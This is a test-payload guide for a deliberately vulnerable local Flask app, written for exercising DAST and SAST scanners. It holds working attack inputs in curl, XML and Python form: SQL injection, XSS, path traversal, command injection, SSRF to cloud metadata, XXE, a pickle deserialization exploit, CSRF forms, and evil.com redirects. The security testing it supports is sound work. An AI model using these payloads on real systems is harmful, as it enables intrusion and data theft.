# Test Payloads for Vulnerable Application

This document provides test payloads for each vulnerability in `vulnerable_app.py` for DAST (Dynamic Application Security Testing) tools.

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Run the application:
```bash
python vulnerable_app.py
```

3. Application runs on: `http://127.0.0.1:5000`

---

## Vulnerability Test Cases

### #1: SQL Injection (Login)

**Endpoint:** `/login`

**Method:** POST or GET

**Payloads:**
```bash
# Basic SQL injection - bypass authentication
curl "http://127.0.0.1:5000/login?username=admin'--&password=anything"

# Union-based injection - extract data
curl "http://127.0.0.1:5000/login?username=admin' UNION SELECT 1,2,3,4,5--&password=x"

# Boolean-based blind injection
curl "http://127.0.0.1:5000/login?username=admin' OR '1'='1&password=x"
```

---

### #2: Cross-Site Scripting (XSS)

**Endpoint:** `/profile`

**Method:** GET

**Payloads:**
```bash
# Reflected XSS in name parameter
curl "http://127.0.0.1:5000/profile?name=<script>alert('XSS')</script>"

# XSS in comment parameter
curl "http://127.0.0.1:5000/profile?comment=<img src=x onerror=alert('XSS')>"

# DOM-based XSS
curl "http://127.0.0.1:5000/profile?name=<svg/onload=alert(document.cookie)>"
```

---

### #3: Information Leakage

**Endpoint:** `/login`

**Method:** GET/POST

**Test:**
```bash
# Trigger error to see stack trace
curl "http://127.0.0.1:5000/login?username=test'&password=x"

# Observe detailed error messages revealing database structure
```

---

### #4: Frame Injection

**Endpoint:** `/frame_content`

**Method:** GET

**Payloads:**
```bash
# Inject malicious iframe
curl "http://127.0.0.1:5000/frame_content?url=javascript:alert('XSS')"

# Load external malicious site
curl "http://127.0.0.1:5000/frame_content?url=https://evil.com/phishing"
```

---

### #5: Open URL Redirection

**Endpoint:** `/redirect`

**Method:** GET

**Payloads:**
```bash
# Redirect to external site
curl -I "http://127.0.0.1:5000/redirect?url=https://evil.com"

# Open redirect with protocol manipulation
curl -I "http://127.0.0.1:5000/redirect?url=//evil.com"

# Javascript protocol
curl -I "http://127.0.0.1:5000/redirect?url=javascript:alert('XSS')"
```

---

### #6: Missing Session Timeout

**Test Method:** Manual testing

**Steps:**
1. Login to the application
2. Note the session cookie
3. Wait extended period (hours/days)
4. Session should still be valid (vulnerability confirmed)

**Check with Developer Tools:**
- Inspect cookies - no `Max-Age` or `Expires` set properly

---

### #7: GET vs POST (Sensitive Data via GET)

**Endpoint:** `/login`

**Method:** GET

**Test:**
```bash
# Passwords sent via GET (will appear in logs, browser history)
curl "http://127.0.0.1:5000/login?username=admin&password=password123"
```

Check:
- Browser history will contain password
- Server logs will log full URL with credentials

---

### #8: Session Cookie Not Marked Secure

**Test Method:** Intercept HTTP response

**Check Headers:**
```bash
curl -I "http://127.0.0.1:5000/login"
```

Look for `Set-Cookie` header - should be missing:
- `Secure` flag (allows cookie over HTTP)
- `HttpOnly` flag (accessible via JavaScript)
- `SameSite` flag (CSRF protection)

---

### #9: Clickjacking (Missing X-Frame-Options)

**Test Method:** Check response headers

**Test:**
```bash
curl -I "http://127.0.0.1:5000/"
```

Missing header: `X-Frame-Options: DENY` or `SAMEORIGIN`

**Proof of Concept:**
Create HTML file with iframe:
```html
<iframe src="http://127.0.0.1:5000/transfer_funds"></iframe>
```

---

### #10: Password in Cleartext

**Endpoint:** `/profile`

**Method:** GET

**Test:**
```bash
# View profile as admin to see password displayed
curl "http://127.0.0.1:5000/profile?name=admin"
```

Password hint displayed in cleartext.

---

### #11: Cache Information in Browser

**Test Method:** Check response headers

**Test:**
```bash
curl -I "http://127.0.0.1:5000/profile"
```

Missing headers:
- `Cache-Control: no-store, no-cache`
- `Pragma: no-cache`

Sensitive data can be cached by browser/proxies.

---

### #12: Weak Encryption (DES)

**Endpoint:** `/encrypt`

**Method:** GET

**Test:**
```bash
curl "http://127.0.0.1:5000/encrypt?data=secretdata"
```

Application uses deprecated DES encryption (easily breakable).

---

### #13: CRLF Injection

**Endpoint:** `/set_header`

**Method:** GET

**Payloads:**
```bash
# Inject CRLF to add malicious headers
curl "http://127.0.0.1:5000/set_header?username=test%0D%0ASet-Cookie:%20malicious=true"

# HTTP Response Splitting
curl "http://127.0.0.1:5000/set_header?username=test%0D%0A%0D%0A<script>alert('XSS')</script>"
```

---

### #14: Trust Boundary Violation

**Endpoint:** `/process_data`

**Method:** GET

**Test:**
```bash
# Mix untrusted input with trusted session data
curl "http://127.0.0.1:5000/process_data?input=malicious_input"
```

---

### #15: Directory Traversal

**Endpoint:** `/download`

**Method:** GET

**Payloads:**
```bash
# Windows path traversal
curl "http://127.0.0.1:5000/download?file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"

# Linux path traversal
curl "http://127.0.0.1:5000/download?file=../../../../etc/passwd"

# Encoded path traversal
curl "http://127.0.0.1:5000/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
```

---

### #16: Session Fixation

**Endpoint:** `/login_with_session`

**Method:** GET

**Test:**
```bash
# Attacker provides session ID
curl "http://127.0.0.1:5000/login_with_session?username=admin&password=password123&session_id=ATTACKER_SESSION"

# Then attacker uses the same session ID
# Session is now authenticated as admin
```

---

### #17: Risky Crypto Algorithm (MD5)

**Location:** Database password hashing

**Test:** Check source code - passwords hashed with MD5

**Verify:**
```bash
# Login functionality uses MD5 for password hashing (visible in source)
# MD5 is cryptographically broken and fast to crack
```

---

### #18: Credential Management (Hardcoded)

**Location:** Source code

**Test:** SAST tools will find in code:
```python
ADMIN_PASSWORD = "password123"
API_KEY = "sk_live_51234567890abcdef"
```

---

### #19: SQL Injection via ORM

**Endpoint:** `/search`

**Method:** GET

**Payloads:**
```bash
# SQL injection in search
curl "http://127.0.0.1:5000/search?q=alice' OR '1'='1"

# Union-based injection
curl "http://127.0.0.1:5000/search?q=' UNION SELECT password, email FROM users--"
```

---

### #20: Resource Shutdown (File Handle Leak)

**Endpoint:** `/read_log`

**Method:** GET

**Test:**
```bash
# Each request leaves file handle open
for i in {1..100}; do curl "http://127.0.0.1:5000/read_log?log=test_$i.log"; done

# Check open file handles (Linux)
lsof -p <python_pid>

# Windows: Resource Monitor
```

---

### #21: CSRF (Cross-Site Request Forgery)

**Endpoint:** `/transfer_funds`

**Method:** POST/GET

**Test:**
```bash
# No CSRF token protection
curl -X POST "http://127.0.0.1:5000/transfer_funds?from=alice&to=bob&amount=100"
```

**HTML Proof of Concept:**
```html
<form action="http://127.0.0.1:5000/transfer_funds" method="POST">
    <input type="hidden" name="from" value="alice">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

---

### #22: SSRF (Server-Side Request Forgery)

**Endpoint:** `/fetch_url`

**Method:** GET

**Payloads:**
```bash
# Access internal resources
curl "http://127.0.0.1:5000/fetch_url?url=http://127.0.0.1:5000"

# Access cloud metadata (AWS)
curl "http://127.0.0.1:5000/fetch_url?url=http://169.254.169.254/latest/meta-data/"

# Access local files (file protocol)
curl "http://127.0.0.1:5000/fetch_url?url=file:///etc/passwd"

# Port scanning
curl "http://127.0.0.1:5000/fetch_url?url=http://127.0.0.1:22"
```

---

### #23: Broken Access Control (IDOR)

**Endpoint:** `/account/<id>`

**Method:** GET

**Test:**
```bash
# Access account 1 (Alice)
curl "http://127.0.0.1:5000/account/1"

# Access account 2 (Bob) - no authorization check
curl "http://127.0.0.1:5000/account/2"

# Sequential discovery
for i in {1..10}; do curl "http://127.0.0.1:5000/account/$i"; done
```

---

### #24: Insecure Deserialization

**Endpoint:** `/load_object`

**Method:** POST

**Test with Python:**
```python
import pickle
import requests
import os

# Create malicious pickle payload
class Exploit:
    def __reduce__(self):
        return (os.system, ('echo HACKED',))

payload = pickle.dumps(Exploit())
response = requests.post('http://127.0.0.1:5000/load_object', data=payload)
print(response.text)
```

---

### #25: Command Injection

**Endpoint:** `/ping`

**Method:** GET

**Payloads:**
```bash
# Command chaining (Windows)
curl "http://127.0.0.1:5000/ping?host=127.0.0.1 & whoami"

# Command chaining (Linux)
curl "http://127.0.0.1:5000/ping?host=127.0.0.1; ls -la"

# Command substitution
curl "http://127.0.0.1:5000/ping?host=127.0.0.1`whoami`"

# Pipe commands
curl "http://127.0.0.1:5000/ping?host=127.0.0.1 | net user"
```

---

### #26: XXE (XML External Entity)

**Endpoint:** `/parse_xml`

**Method:** POST

**Payloads:**

**Basic XXE (File Disclosure):**
```bash
curl -X POST http://127.0.0.1:5000/parse_xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'
```

**Windows:**
```bash
curl -X POST http://127.0.0.1:5000/parse_xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>'
```

**XXE with SSRF:**
```bash
curl -X POST http://127.0.0.1:5000/parse_xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:5000/">
]>
<root>&xxe;</root>'
```

---

## DAST Tool Configuration

### OWASP ZAP
1. Set proxy to 127.0.0.1:8080
2. Spider the application starting from http://127.0.0.1:5000
3. Active Scan all URLs
4. Review alerts for all 26+ vulnerabilities

### Burp Suite
1. Configure browser proxy
2. Browse all endpoints
3. Run Active Scanner
4. Check for injection points in parameters

### Nikto
```bash
nikto -h http://127.0.0.1:5000
```

### sqlmap
```bash
sqlmap -u "http://127.0.0.1:5000/login?username=test&password=test" --batch
```

---

## Expected SAST Findings

SAST tools should detect:
- Hardcoded credentials (#18)
- SQL injection patterns (#1, #19)
- Command injection patterns (#25)
- Weak crypto usage (#12, #17)
- Insecure deserialization (#24)
- XSS vulnerabilities (#2)
- Path traversal (#15)
- Missing security headers (configuration)
- Resource leaks (#20)
- SSRF patterns (#22)
- XXE vulnerabilities (#26)

---

## Notes

- All vulnerabilities are intentional for testing purposes
- Never deploy this application to production
- Use in isolated testing environments only
- Ensure proper authorization before testing on any systems
